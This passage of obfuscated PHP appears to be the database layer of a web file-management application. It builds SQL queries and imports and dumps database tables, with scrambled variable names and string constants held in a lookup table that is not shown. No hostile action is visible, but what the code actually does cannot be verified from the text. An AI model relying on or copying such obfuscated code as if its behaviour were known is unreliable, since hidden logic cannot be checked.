$³‚ÌŞ«‰[63] . $this->parseValue($ŞôÀÉ£[1]); } } elseif ($³‚ÌŞ«‰[306] == $¡ÑøÌ’è) { $†¥ú»‹· .= $³‚ÌŞ«‰[897] . $‹€ªµ° . $³‚ÌŞ«‰[63] . $ŞôÀÉ£[1] . $³‚ÌŞ«‰[1012]; } elseif (preg_match($³‚ÌŞ«‰[1013], $ŞôÀÉ£[0])) { $†¥ú»‹· .= $ŞôÀÉ£[0]; } elseif (preg_match($³‚ÌŞ«‰[1014], $ŞôÀÉ£[0])) { if (isset($ŞôÀÉ£[2]) && $³‚ÌŞ«‰[306] == $ŞôÀÉ£[2]) { $†¥ú»‹· .= $‹€ªµ° . $³‚ÌŞ«‰[63] . $this->exp[$¡ÑøÌ’è] . $³‚ÌŞ«‰[63] . $ŞôÀÉ£[1]; } else { if (is_string($ŞôÀÉ£[1])) { $ŞôÀÉ£[1] = explode($³‚ÌŞ«‰[60], $ŞôÀÉ£[1]); } $ò…µµ±˜ = implode($³‚ÌŞ«‰[60], $this->parseValue($ŞôÀÉ£[1])); $†¥ú»‹· .= $‹€ªµ° . $³‚ÌŞ«‰[63] . $this->exp[$¡ÑøÌ’è] . $³‚ÌŞ«‰[897] . $ò…µµ±˜ . $³‚ÌŞ«‰[899]; } } elseif (preg_match($³‚ÌŞ«‰[1015], $ŞôÀÉ£[0])) { $ë®ÑûÎó = is_string($ŞôÀÉ£[1]) ? explode($³‚ÌŞ«‰[60], $ŞôÀÉ£[1]) : $ŞôÀÉ£[1]; $†¥ú»‹· .= $³‚ÌŞ«‰[897] . $‹€ªµ° . $³‚ÌŞ«‰[63] . $this->exp[$¡ÑøÌ’è] . $³‚ÌŞ«‰[63] . $this->parseValue($ë®ÑûÎó[0]) . $³‚ÌŞ«‰[998] . $this->parseValue($ë®ÑûÎó[1]) . $³‚ÌŞ«‰[287]; } else { think_exception(think_lang($³‚ÌŞ«‰[1001]) . $³‚ÌŞ«‰[4] . $ŞôÀÉ£[0]); } } else { $ÂÇÆÒ‡… = count($ŞôÀÉ£); $À—Ñ‰Óˆ = $³‚ÌŞ«‰[12]; if (is_string($ŞôÀÉ£[$ÂÇÆÒ‡… - 1])) { $À—Ñ‰Óˆ = isset($ŞôÀÉ£[$ÂÇÆÒ‡… - 1]) ? strtoupper($ŞôÀÉ£[$ÂÇÆÒ‡… - 1]) : $³‚ÌŞ«‰[12]; if (in_array($À—Ñ‰Óˆ, array($³‚ÌŞ«‰[995], $³‚ÌŞ«‰[996], $³‚ÌŞ«‰[997]))) { $ÂÇÆÒ‡… = $ÂÇÆÒ‡… - 1; } } else { $À—Ñ‰Óˆ = $³‚ÌŞ«‰[995]; } for ($¡˜¦Çö‰ = 0; $¡˜¦Çö‰ < $ÂÇÆÒ‡…; $¡˜¦Çö‰++) { $ë®ÑûÎó = is_array($ŞôÀÉ£[$¡˜¦Çö‰]) ? $ŞôÀÉ£[$¡˜¦Çö‰][1] : $ŞôÀÉ£[$¡˜¦Çö‰]; if ($³‚ÌŞ«‰[306] == strtolower($ŞôÀÉ£[$¡˜¦Çö‰][0])) { $†¥ú»‹· .= $³‚ÌŞ«‰[269] . $‹€ªµ° . $³‚ÌŞ«‰[63] . $ë®ÑûÎó . $³‚ÌŞ«‰[1012] . $À—Ñ‰Óˆ . $³‚ÌŞ«‰[63]; } else { $“©æ· ² = is_array($ŞôÀÉ£[$¡˜¦Çö‰]) ? $this->exp[strtolower($ŞôÀÉ£[$¡˜¦Çö‰][0])] : $³‚ÌŞ«‰[878]; if (!$“©æ· ² && is_array($ŞôÀÉ£[$¡˜¦Çö‰]) && in_array($ŞôÀÉ£[$¡˜¦Çö‰][0], array($³‚ÌŞ«‰[878], $³‚ÌŞ«‰[1005], $³‚ÌŞ«‰[1006], $³‚ÌŞ«‰[1007], $³‚ÌŞ«‰[1008], $³‚ÌŞ«‰[1009]))) { $“©æ· ² = $ŞôÀÉ£[$¡˜¦Çö‰][0]; } $†¥ú»‹· .= $³‚ÌŞ«‰[269] . $‹€ªµ° . $³‚ÌŞ«‰[63] . $“©æ· ² . $³‚ÌŞ«‰[63] . $this->parseValue($ë®ÑûÎó) . $³‚ÌŞ«‰[1012] . $À—Ñ‰Óˆ . $³‚ÌŞ«‰[63]; } } $†¥ú»‹· = substr($†¥ú»‹·, 0, -4); } } else { $†¥ú»‹· .= $‹€ªµ° . $³‚ÌŞ«‰[1016] . $this->parseValue($ŞôÀÉ£); } return $†¥ú»‹·; } protected function parseThinkWhere($†üÒ€Ì­, $ğŞóïê) { $¼šº›â¯ =& $_SERVER[¤·²È‰º]; $°¶ÔÜŸ = $¼šº›â¯[12]; switch ($†üÒ€Ì­) { case $¼šº›â¯[361]: $°¶ÔÜŸ = $ğŞóïê; break; case $¼šº›â¯[999]: $°¶ÔÜŸ = is_string($ğŞóïê) ? $ğŞóïê : substr($this->parseWhere($ğŞóïê), 6); break; case $¼šº›â¯[1017]: parse_str($ğŞóïê, $Œ¶Èêşö); if (isset($Œ¶Èêşö[$¼šº›â¯[994]])) { $Ğ·²ğ… = $¼šº›â¯[63] . strtoupper($Œ¶Èêşö[$¼šº›â¯[994]]) . $¼šº›â¯[63]; unset($Œ¶Èêşö[$¼šº›â¯[994]]); } else { $Ğ·²ğ… = $¼šº›â¯[998]; } $¡ä÷Š = array(); foreach ($Œ¶Èêşö as $šÊôÍÀÇ => $é¶ïÚ) { $¡ä÷Š[] = $this->parseKey($šÊôÍÀÇ) . $¼šº›â¯[1016] . $this->parseValue($é¶ïÚ); } $°¶ÔÜŸ = implode($Ğ·²ğ…, $¡ä÷Š); break; } return $°¶ÔÜŸ; } protected function parseLimit($ÕÊµê¬) { $ÕğèÖï =& $_SERVER[¤·²È‰º]; return !empty($ÕÊµê¬) ? $ÕğèÖï[61] . $ÕÊµê¬ . $ÕğèÖï[63] : $ÕğèÖï[12]; } protected function parseJoin($á¢ıÈ¶ë) { $‡ØİıÍò =& $_SERVER[¤·²È‰º]; $Êü„¶šØ = $‡ØİıÍò[12]; if (!empty($á¢ıÈ¶ë)) { if (is_array($á¢ıÈ¶ë)) { foreach ($á¢ıÈ¶ë as $‹û×–ñÏ => $¬¨È¬È›) { if (!1 !== stripos($¬¨È¬È›, $‡ØİıÍò[1018])) { $Êü„¶šØ .= $‡ØİıÍò[63] . $¬¨È¬È›; } else { $Êü„¶šØ .= $‡ØİıÍò[1019] . $¬¨È¬È›; } } } else { $Êü„¶šØ .= $‡ØİıÍò[1019] . $á¢ıÈ¶ë; } } $Êü„¶šØ = preg_replace($‡ØİıÍò[1020], think_config($‡ØİıÍò[924]) . $‡ØİıÍò[1021], $Êü„¶šØ); return $Êü„¶šØ; } protected function parseOrder($úÑ›Ÿµ) { $½İê¬İ =& $_SERVER[¤·²È‰º]; if (is_array($úÑ›Ÿµ)) { $Ş˜—±ÍÕ = array(); foreach ($úÑ›Ÿµ as $”Èì¬Š‰ => $òìÅ¬Üõ) { if (is_numeric($”Èì¬Š‰)) { $Ş˜—±ÍÕ[] = $this->parseKey($òìÅ¬Üõ); } else { $òìÅ¬Üõ = in_array(strtoupper(trim($òìÅ¬Üõ)), array($½İê¬İ[1022], $½İê¬İ[1023])) ? $½İê¬İ[63] . $òìÅ¬Üõ : $½İê¬İ[12]; if (preg_match($½İê¬İ[1024], $”Èì¬Š‰)) { $Ş˜—±ÍÕ[] = $this->parseKey($”Èì¬Š‰) . $òìÅ¬Üõ; } else { think_exception($½İê¬İ[1025] . $”Èì¬Š‰); } } } $úÑ›Ÿµ = implode($½İê¬İ[60], $Ş˜—±ÍÕ); } return !empty($úÑ›Ÿµ) ? $½İê¬İ[1026] . $úÑ›Ÿµ : $½İê¬İ[12]; } protected function parseGroup($¦ÀöÄşê) { $ªÇª‹çÄ =& $_SERVER[¤·²È‰º]; return !empty($¦ÀöÄşê) ? $ªÇª‹çÄ[1027] . $¦ÀöÄşê : $ªÇª‹çÄ[12]; } protected function parseHaving($ûş‡€ìµ) { $Ä•Ãä«Ø =& $_SERVER[¤·²È‰º]; return !empty($ûş‡€ìµ) ? $Ä•Ãä«Ø[1028] . $ûş‡€ìµ : $Ä•Ãä«Ø[12]; } protected function parseComment($ª½ª‚¸Ú) { $Ç„çå‹… =& $_SERVER[¤·²È‰º]; return !empty($ª½ª‚¸Ú) ? $Ç„çå‹…[1029] . $ª½ª‚¸Ú . $Ç„çå‹…[1030] : $Ç„çå‹…[12]; } protected function parseDistinct($ê¾Ñ¯â³) { $Áêã÷ =& $_SERVER[¤·²È‰º]; return !empty($ê¾Ñ¯â³) ? $Áêã÷[1031] : $Áêã÷[12]; } protected function parseUnion($™±•Šîå) { $½Æ¡èú =& $_SERVER[¤·²È‰º]; if (empty($™±•Šîå)) { return $½Æ¡èú[12]; } if (isset($™±•Šîå[$½Æ¡èú[357]])) { $ôè«Üå’ = $½Æ¡èú[1032]; unset($™±•Šîå[$½Æ¡èú[357]]); } else { $ôè«Üå’ = $½Æ¡èú[1033]; } foreach ($™±•Šîå as $ïê©Ûß”) { $ê›ÍÔ­[] = $ôè«Üå’ . (is_array($ïê©Ûß”) ? $this->buildSelectSql($ïê©Ûß”) : $ïê©Ûß”); } return implode($½Æ¡èú[63], $ê›ÍÔ­); } public function insert($òÇ†î˜Ø, $ßÕåš½ı = array(), $‰­Á€–Ş = false) { $Œø·´¹€ =& $_SERVER[¤·²È‰º]; $¥äˆÛ¹‹ = $É¸•Ëù² = array(); $this->model = $ßÕåš½ı[$Œø·´¹€[290]]; foreach ($òÇ†î˜Ø as $·Æ¡ûìš => $øæãÕù²) { if (is_array($øæãÕù²) && $Œø·´¹€[306] == $øæãÕù²[0]) { $É¸•Ëù²[] = $this->parseKey($·Æ¡ûìš); $¥äˆÛ¹‹[] = $øæãÕù²[1]; } elseif (is_scalar($øæãÕù²) || is_null($øæãÕù²)) { $É¸•Ëù²[] = $this->parseKey($·Æ¡ûìš); $¥äˆÛ¹‹[] = $this->parseValue($øæãÕù²); } } $‹‹ßŞ—Õ = ($‰­Á€–Ş ? $Œø·´¹€[901] : $Œø·´¹€[902]) . $Œø·´¹€[903] . $this->parseTable($ßÕåš½ı[$Œø·´¹€[288]]) . $Œø·´¹€[897] . implode($Œø·´¹€[60], $É¸•Ëù²) . $Œø·´¹€[898] . implode($Œø·´¹€[60], $¥äˆÛ¹‹) . $Œø·´¹€[899]; $‹‹ßŞ—Õ .= $this->parseLock(isset($ßÕåš½ı[$Œø·´¹€[844]]) ? $ßÕåš½ı[$Œø·´¹€[844]] : !1); $‹‹ßŞ—Õ .= $this->parseComment(!empty($ßÕåš½ı[$Œø·´¹€[363]]) ? $ßÕåš½ı[$Œø·´¹€[363]] : $Œø·´¹€[12]); return $this->execute($‹‹ßŞ—Õ, $this->parseBind(!empty($ßÕåš½ı[$Œø·´¹€[294]]) ? $ßÕåš½ı[$Œø·´¹€[294]] : array())); } public function selectInsert($üÎ’œØÊ, $ÈªØÅ µ, $¢ßŒù£³ = array()) { $™¡¸»‰² =& $_SERVER[¤·²È‰º]; $this->model = $¢ßŒù£³[$™¡¸»‰²[290]]; if (is_string($üÎ’œØÊ)) { $üÎ’œØÊ = explode($™¡¸»‰²[60], $üÎ’œØÊ); } array_walk($üÎ’œØÊ, array($this, $™¡¸»‰²[900])); $Øİ£ŞæÄ = $™¡¸»‰²[1034] . $this->parseTable($ÈªØÅ µ) . $™¡¸»‰²[897] . implode($™¡¸»‰²[60], $üÎ’œØÊ) . $™¡¸»‰²[1012]; $Øİ£ŞæÄ .= $this->buildSelectSql($¢ßŒù£³); return $this->execute($Øİ£ŞæÄ, $this->parseBind(!empty($¢ßŒù£³[$™¡¸»‰²[294]]) ? $¢ßŒù£³[$™¡¸»‰²[294]] : array())); } public function update($½¦±şÏ, $»‰ò‹Ä‘) { $ôæ¹Ü‚ =& $_SERVER[¤·²È‰º]; $this->model = $»‰ò‹Ä‘[$ôæ¹Ü‚[290]]; $åœ¹±Ö = $ôæ¹Ü‚[1035] . $this->parseTable($»‰ò‹Ä‘[$ôæ¹Ü‚[288]]) . $this->parseSet($½¦±şÏ) . $this->parseWhere(!empty($»‰ò‹Ä‘[$ôæ¹Ü‚[284]]) ? $»‰ò‹Ä‘[$ôæ¹Ü‚[284]] : $ôæ¹Ü‚[12]) . $this->parseOrder(!empty($»‰ò‹Ä‘[$ôæ¹Ü‚[374]]) ? $»‰ò‹Ä‘[$ôæ¹Ü‚[374]] : $ôæ¹Ü‚[12]) . $this->parseLimit(!empty($»‰ò‹Ä‘[$ôæ¹Ü‚[301]]) ? $»‰ò‹Ä‘[$ôæ¹Ü‚[301]] : $ôæ¹Ü‚[12]) . $this->parseLock(isset($»‰ò‹Ä‘[$ôæ¹Ü‚[844]]) ? $»‰ò‹Ä‘[$ôæ¹Ü‚[844]] : !1) . $this->parseComment(!empty($»‰ò‹Ä‘[$ôæ¹Ü‚[363]]) ? $»‰ò‹Ä‘[$ôæ¹Ü‚[363]] : $ôæ¹Ü‚[12]); return $this->execute($åœ¹±Ö, $this->parseBind(!empty($»‰ò‹Ä‘[$ôæ¹Ü‚[294]]) ? $»‰ò‹Ä‘[$ôæ¹Ü‚[294]] : array())); } public function delete($è–ÇíÄç = array()) { $ûÆÁÒŸ™ =& $_SERVER[¤·²È‰º]; $this->model = $è–ÇíÄç[$ûÆÁÒŸ™[290]]; $­ûŸõåÎ = $ûÆÁÒŸ™[1036] . $this->parseTable($è–ÇíÄç[$ûÆÁÒŸ™[288]]) . $this->parseWhere(!empty($è–ÇíÄç[$ûÆÁÒŸ™[284]]) ? $è–ÇíÄç[$ûÆÁÒŸ™[284]] : $ûÆÁÒŸ™[12]) . $this->parseOrder(!empty($è–ÇíÄç[$ûÆÁÒŸ™[374]]) ? $è–ÇíÄç[$ûÆÁÒŸ™[374]] : $ûÆÁÒŸ™[12]) . $this->parseLimit(!empty($è–ÇíÄç[$ûÆÁÒŸ™[301]]) ? $è–ÇíÄç[$ûÆÁÒŸ™[301]] : $ûÆÁÒŸ™[12]) . $this->parseLock(isset($è–ÇíÄç[$ûÆÁÒŸ™[844]]) ? $è–ÇíÄç[$ûÆÁÒŸ™[844]] : !1) . $this->parseComment(!empty($è–ÇíÄç[$ûÆÁÒŸ™[363]]) ? $è–ÇíÄç[$ûÆÁÒŸ™[363]] : $ûÆÁÒŸ™[12]); return $this->execute($­ûŸõåÎ, $this->parseBind(!empty($è–ÇíÄç[$ûÆÁÒŸ™[294]]) ? $è–ÇíÄç[$ûÆÁÒŸ™[294]] : array())); } public function select($°ûÔÑß• = array()) { $Á÷öšèÄ =& $_SERVER[¤·²È‰º]; $this->model = $°ûÔÑß•[$Á÷öšèÄ[290]]; $á©Áíğ÷ = $this->buildSelectSql($°ûÔÑß•); $¸‚Âèú = isset($°ûÔÑß•[$Á÷öšèÄ[358]]) ? $°ûÔÑß•[$Á÷öšèÄ[358]] : !1; if ($¸‚Âèú) { $€ò‰–Ó = is_string($¸‚Âèú[$Á÷öšèÄ[104]]) ? $¸‚Âèú[$Á÷öšèÄ[104]] : $Á÷öšèÄ[1037] . md5($á©Áíğ÷); $İî¾á¼¤ = think_cache($€ò‰–Ó, $Á÷öšèÄ[12], $¸‚Âèú); if (!1 !== $İî¾á¼¤) { return $İî¾á¼¤; } } $ù”å¥¦± = $this->query($á©Áíğ÷, $this->parseBind(!empty($°ûÔÑß•[$Á÷öšèÄ[294]]) ? $°ûÔÑß•[$Á÷öšèÄ[294]] : array())); if ($¸‚Âèú && !1 !== $ù”å¥¦±) { think_cache($€ò‰–Ó, $ù”å¥¦±, $¸‚Âèú); } return $ù”å¥¦±; } public function buildSelectSql($ìç§ØŸ = array()) { $Ïâæ“»œ =& $_SERVER[¤·²È‰º]; if (isset($ìç§ØŸ[$Ïâæ“»œ[362]])) { if (strpos($ìç§ØŸ[$Ïâæ“»œ[362]], $Ïâæ“»œ[60])) { list($â†€Ë¨Ä, $½Š“‘”—) = explode($Ïâæ“»œ[60], $ìç§ØŸ[$Ïâæ“»œ[362]]); } else { $â†€Ë¨Ä = $ìç§ØŸ[$Ïâæ“»œ[362]]; } $â†€Ë¨Ä = $â†€Ë¨Ä ? $â†€Ë¨Ä : 1; $½Š“‘”— = isset($½Š“‘”—) ? $½Š“‘”— : (is_numeric($ìç§ØŸ[$Ïâæ“»œ[301]]) ? $ìç§ØŸ[$Ïâæ“»œ[301]] : 20); $•ñ‡—«¹ = $½Š“‘”— * ((int) $â†€Ë¨Ä - 1); $ìç§ØŸ[$Ïâæ“»œ[301]] = $•ñ‡—«¹ . $Ïâæ“»œ[60] . $½Š“‘”—; } if (think_config($Ïâæ“»œ[1038])) { $Òï’Ó–’ = $Ïâæ“»œ[1039] . md5(serialize($ìç§ØŸ)); $ƒÛßªâ = think_cache($Òï’Ó–’); if ($ƒÛßªâ) { return $ƒÛßªâ; } } $ƒ‰ÛÍÈ© = $this->parseSql($this->selectSql, $ìç§ØŸ); $ƒ‰ÛÍÈ© .= $this->parseLock(isset($ìç§ØŸ[$Ïâæ“»œ[844]]) ? $ìç§ØŸ[$Ïâæ“»œ[844]] : !1); if (isset($Òï’Ó–’)) { think_cache($Òï’Ó–’, $ƒ‰ÛÍÈ©); } return $ƒ‰ÛÍÈ©; } public function parseSql($à¬ùï‹µ, $‰â’üì¦ = array()) { $íÖÖîÏ¾ =& $_SERVER[¤·²È‰º]; $à¬ùï‹µ = str_replace(array($íÖÖîÏ¾[1040], $íÖÖîÏ¾[1041], $íÖÖîÏ¾[1042], $íÖÖîÏ¾[1043], $íÖÖîÏ¾[1044], $íÖÖîÏ¾[1045], $íÖÖîÏ¾[1046], $íÖÖîÏ¾[1047], $íÖÖîÏ¾[1048], $íÖÖîÏ¾[1049], $íÖÖîÏ¾[1050]), array($this->parseTable("{$‰â’üì¦[$íÖÖîÏ¾[288]]}"), $this->parseDistinct(isset($‰â’üì¦[$íÖÖîÏ¾[1051]]) ? $‰â’üì¦[$íÖÖîÏ¾[1051]] : !1), $this->parseField(!empty($‰â’üì¦[$íÖÖîÏ¾[282]]) ? $‰â’üì¦[$íÖÖîÏ¾[282]] : $íÖÖîÏ¾[198]), $this->parseJoin(!empty($‰â’üì¦[$íÖÖîÏ¾[291]]) ? $‰â’üì¦[$íÖÖîÏ¾[291]] : $íÖÖîÏ¾[12]), $this->parseWhere(!empty($‰â’üì¦[$íÖÖîÏ¾[284]]) ? $‰â’üì¦[$íÖÖîÏ¾[284]] : $íÖÖîÏ¾[12]), $this->parseGroup(!empty($‰â’üì¦[$íÖÖîÏ¾[523]]) ? $‰â’üì¦[$íÖÖîÏ¾[523]] : $íÖÖîÏ¾[12]), $this->parseHaving(!empty($‰â’üì¦[$íÖÖîÏ¾[1052]]) ? $‰â’üì¦[$íÖÖîÏ¾[1052]] : $íÖÖîÏ¾[12]), $this->parseOrder(!empty($‰â’üì¦[$íÖÖîÏ¾[374]]) ? $‰â’üì¦[$íÖÖîÏ¾[374]] : $íÖÖîÏ¾[12]), $this->parseLimit(!empty($‰â’üì¦[$íÖÖîÏ¾[301]]) ? $‰â’üì¦[$íÖÖîÏ¾[301]] : $íÖÖîÏ¾[12]), $this->parseUnion(!empty($‰â’üì¦[$íÖÖîÏ¾[356]]) ? $‰â’üì¦[$íÖÖîÏ¾[356]] : $íÖÖîÏ¾[12]), $this->parseComment(!empty($‰â’üì¦[$íÖÖîÏ¾[363]]) ? $‰â’üì¦[$íÖÖîÏ¾[363]] : $íÖÖîÏ¾[12])), $à¬ùï‹µ); return $à¬ùï‹µ; } public function getLastSql($‡Ïªö›¾ = '') { return $‡Ïªö›¾ ? $this->modelSql[$‡Ïªö›¾] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($ìğ™©îˆ) { return addslashes($ìğ™©îˆ); } public function setModel($êöĞæÍÛ) { $this->model = $êöĞæÍÛ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($ß‹ÒØ Ó = array()) { $ç‘ú±®• =& $_SERVER[¤·²È‰º]; if (empty($ß‹ÒØ Ó)) { $ß‹ÒØ Ó = $GLOBALS[$ç‘ú±®•[6]][$ç‘ú±®•[31]]; } $this->database = $ß‹ÒØ Ó; } public function model($”¬Ø„ã› = '') { return new ModelBase($”¬Ø„ã›, $_SERVER[¤·²È‰º][12], $this->database); } public function db($âƒ§ÜÅ¡ = false) { $âõ·¢ÄÔ =& $_SERVER[¤·²È‰º]; $ïëÙĞ›î = array_change_key_case($this->database); if ($this->dbType() == $âõ·¢ÄÔ[23] || !$âƒ§ÜÅ¡) { return $this->model()->db(); } $íèìªï˜ = $ïëÙĞ›î[$âõ·¢ÄÔ[966]]; $ïëÙĞ›î[$âõ·¢ÄÔ[966]] = $âõ·¢ÄÔ[12]; if ($ïëÙĞ›î[$âõ·¢ÄÔ[961]] == $âõ·¢ÄÔ[958]) { $ŸªÖ„ªÖ = $ïëÙĞ›î[$âõ·¢ÄÔ[967]]; $ïëÙĞ›î[$âõ·¢ÄÔ[967]] = substr($ŸªÖ„ªÖ, 0, strrpos($ŸªÖ„ªÖ, $âõ·¢ÄÔ[1053])); } $this->database = $ïëÙĞ›î; $œ´¹¸Ø = $this->model()->db(); try { $à¡á³Áù = $œ´¹¸Ø->execute("\163\150\157\x77\40\144\x61\x74\x61\x62\x61\163\x65\163\x20\x6c\x69\x6b\145\40\47{$íèìªï˜}\47"); } catch (Exception $¶ç¶Óó¡) { } if (!$à¡á³Áù) { $œ´¹¸Ø->execute("\x63\162\145\x61\x74\145\x20\144\x61\x74\x61\142\141\x73\x65\40\x60{$íèìªï˜}\x60"); } $ïëÙĞ›î[$âõ·¢ÄÔ[966]] = $íèìªï˜; if ($ïëÙĞ›î[$âõ·¢ÄÔ[961]] == $âõ·¢ÄÔ[958]) { $ïëÙĞ›î[$âõ·¢ÄÔ[967]] .= $âõ·¢ÄÔ[1053] . $íèìªï˜; } $this->database = $ïëÙĞ›î; $œ´¹¸Ø->execute("\165\163\x65\x20\x60{$íèìªï˜}\140"); return $œ´¹¸Ø; } public function createTable($ìÓï‡Í, &$İ »·Î¸) { $âÖ¼¤®– =& $_SERVER[¤·²È‰º]; if (!IO::exist($ìÓï‡Í)) { ActionCall($âÖ¼¤®–[1054], !0, 0); show_json(LNG($âÖ¼¤®–[1055]), !1); } $÷¼Â§“Á = $this->model()->db(); $á­À˜ë² = sqlSplit(IO::getContent($ìÓï‡Í)); foreach ($á­À˜ë² as $Ú«£áşï) { $ã¼±áê = stripos($Ú«£áşï, $âÖ¼¤®–[1056]) === 0; if ($ã¼±áê) { $İ »·Î¸->task[$âÖ¼¤®–[787]] += 1; } $÷¼Â§“Á->execute($Ú«£áşï); if ($ã¼±áê) { preg_match($âÖ¼¤®–[1057], $Ú«£áşï, $ñ™‡ÎŞ); $İ »·Î¸->task[$âÖ¼¤®–[1058]] = $ñ™‡ÎŞ[1]; $İ »·Î¸->update(1); } } } public function insertTable($…Ò¸Í×, &$ß¢ÄÆ®æ) { $ôˆ²Ê’ =& $_SERVER[¤·²È‰º]; $Ê›ŞŒğé = $this->model()->db(); $Ë§ºı² = $õ¯©èÁ¯ ? array($õ¯©èÁ¯) : $Ê›ŞŒğé->getTables(); foreach ($…Ò¸Í× as $“ùÈÒØ¤) { $õ¯©èÁ¯ = basename($“ùÈÒØ¤, $ôˆ²Ê’[789]); if (!in_array($õ¯©èÁ¯, $Ë§ºı²)) { continue; } $ß¢ÄÆ®æ->task[$ôˆ²Ê’[1058]] = $õ¯©èÁ¯; if (get_filesize($“ùÈÒØ¤) == 0) { continue; } $µ–Ç¢Š¿ = $this->sqlToDb($“ùÈÒØ¤, $ß¢ÄÆ®æ); if (!$µ–Ç¢Š¿) { ActionCall($ôˆ²Ê’[1054], !0, 0); show_json(LNG($ôˆ²Ê’[1059]) . "\x5b{$õ¯©èÁ¯}\135", !1); } } } public function sqlFromDb($ÏÄìªÕ°, $Õ»‡­şé, &$‰¾œ´», $¾Şõí˜÷ = '') { if ($‰¾œ´») { $‰¾œ´»->task[$_SERVER[¤·²È‰º][1058]] = $ÏÄìªÕ°; } $¯Ù›Øó = $this->model($ÏÄìªÕ°); $ÑÅø®ß¾ = 0; $ŒòÛĞÚ¹ = 0; $¢ÛÌ£¯ƒ = 10000; $Ô—¡§Äê = fopen($Õ»‡­şé, $_SERVER[¤·²È‰º][1060]); $ùŸî„è½ = $¯Ù›Øó->getPk(); $‹½œ¹¬² = $¯Ù›Øó->getDbFields(); $¹Í´¥Íã = $_SERVER[¤·²È‰º][12]; if ($GLOBALS[$_SERVER[¤·²È‰º][788]] && in_array($ÏÄìªÕ°, array($_SERVER[¤·²È‰º][1061], $_SERVER[¤·²È‰º][1062]))) { $¹Í´¥Íã = $ÏÄìªÕ°; } do { $Êò“¡±ü = array($ùŸî„è½ => array($_SERVER[¤·²È‰º][1008], $ŒòÛĞÚ¹)); $ºØ×’ä‹ = $¯Ù›Øó->where($Êò“¡±ü)->field($‹½œ¹¬²)->order($ùŸî„è½ . $_SERVER[¤·²È‰º][1063])->limit($¢ÛÌ£¯ƒ)->select(); $ºØ×’ä‹ = !empty($ºØ×’ä‹) ? $ºØ×’ä‹ : array(); if (!($«¼¸ğ§ê = count($ºØ×’ä‹))) { break; } $Æ§óÌ¯ = end($ºØ×’ä‹); $ŒòÛĞÚ¹ = $Æ§óÌ¯[$ùŸî„è½]; $ã„œ®Š² = array(); foreach ($ºØ×’ä‹ as $àöŸÜØß) { if ($¹Í´¥Íã) { if ($ÏÄìªÕ° == $_SERVER[¤·²È‰º][1061]) { if ($àöŸÜØß[$_SERVER[¤·²È‰º][43]] == $_SERVER[¤·²È‰º][1064]) { $Ş‡ïœ¬ô = json_decode($àöŸÜØß[$_SERVER[¤·²È‰º][383]], !0); if ($Ş‡ïœ¬ô[$_SERVER[¤·²È‰º][42]] == $GLOBALS[$_SERVER[¤·²È‰º][788]] && $Ş‡ïœ¬ô[$_SERVER[¤·²È‰º][751]] != 1) { continue; } } } else { if ($àöŸÜØß[$_SERVER[¤·²È‰º][43]] == $_SERVER[¤·²È‰º][1065] && $àöŸÜØß[$_SERVER[¤·²È‰º][104]] == $_SERVER[¤·²È‰º][780]) { continue; } } } if ($¾Şõí˜÷) { $àöŸÜØß[$_SERVER[¤·²È‰º][94]] = "\173\151\x6f\72{$¾Şõí˜÷}\x7d" . substr($àöŸÜØß[$_SERVER[¤·²È‰º][94]], strlen("\x7b\x69\157\x3a{$àöŸÜØß[$_SERVER[¤·²È‰º][818]]}\175")); $àöŸÜØß[$_SERVER[¤·²È‰º][818]] = $¾Şõí˜÷; } $ã„œ®Š²[] = $_SERVER[¤·²È‰º][1066] . $this->sqlEncode($àöŸÜØß) . $_SERVER[¤·²È‰º][1067]; } $ôîæŒ³· = "\111\x4e\x53\x45\122\x54\x20\x49\116\x54\117\x20\x60{$ÏÄìªÕ°}\x60\40\50\140" . implode($_SERVER[¤·²È‰º][1068], $‹½œ¹¬²) . $_SERVER[¤·²È‰º][1069]; fwrite($Ô—¡§Äê, $ôîæŒ³· . implode($_SERVER[¤·²È‰º][1070], $ã„œ®Š²) . $_SERVER[¤·²È‰º][81] . PHP_EOL); $ÑÅø®ß¾ += $«¼¸ğ§ê; if ($‰¾œ´») { $‰¾œ´»->update($«¼¸ğ§ê); } } while ($¢ÛÌ£¯ƒ == $«¼¸ğ§ê); fclose($Ô—¡§Äê); return $ÑÅø®ß¾; } public function sqlToDb($¶ëˆ’ó, &$²æÓÉıÉ) { $ÛàŞÆ¬ =& $_SERVER[¤·²È‰º]; $š¡¹½˜¥ = $this->model()->db(); $”ÒÜ—İñ = @fopen($¶ëˆ’ó, $ÛàŞÆ¬[1071]); if (!$”ÒÜ—İñ) { return !1; } $ÂßÉÒÓÇ = 0; $í’œ›¥ = $ÛàŞÆ¬[12]; $²ª¼ÖŠ¤ = array(); $¨ùÀŸĞó = $this->dbType(); $€ä»ÕÄ = $¨ùÀŸĞó == $ÛàŞÆ¬[23] ? 500 : 2000; $Õä›‘†Ê = basename($¶ëˆ’ó, $ÛàŞÆ¬[789]); $ÂàÑÇŞ = 0; $¿¹‰õİ = 4194304 - 104858; $”¢…éå = 1000000 - 104858; while (!feof($”ÒÜ—İñ)) { $¶ËàÓ§» = trim(fgets($”ÒÜ—İñ)); if (!$¶ËàÓ§») { continue; } $Æ­‡İã = $this->sqlDecode($¶ËàÓ§», $¨ùÀŸĞó, $Õä›‘†Ê); if (stripos($Æ­‡İã, $ÛàŞÆ¬[364]) === 0) { if (!$í’œ›¥) { $í’œ›¥ = $Æ­‡İã . $ÛàŞÆ¬[63]; } continue; } if ($²æÓÉıÉ) { $²æÓÉıÉ->task[$ÛàŞÆ¬[787]] += 1; } $ÂßÉÒÓÇ++; $²ª¼ÖŠ¤[] = rtrim(rtrim(trim($Æ­‡İã), $ÛàŞÆ¬[60]), $ÛàŞÆ¬[81]); $Àİíâ™« = null; $ÔÀçæ†ï = strlen($Æ­‡İã); $ÂàÑÇŞ += $ÔÀçæ†ï; if ($ÂàÑÇŞ >= ($€ä»ÕÄ == 500 ? $”¢…éå : $¿¹‰õİ)) { $Àİíâ™« = array_pop($²ª¼ÖŠ¤); if ($ÂßÉÒÓÇ > 1) { $ÂßÉÒÓÇ--; } } if ($ÂßÉÒÓÇ >= $€ä»ÕÄ || $Àİíâ™«) { $Æ­‡İã = $í’œ›¥ . implode($ÛàŞÆ¬[60], $²ª¼ÖŠ¤); if (!$š¡¹½˜¥->execute($Æ­‡İã)) { return !1; } if ($²æÓÉıÉ) { $²æÓÉıÉ->update($ÂßÉÒÓÇ); } $²ª¼ÖŠ¤ = array(); 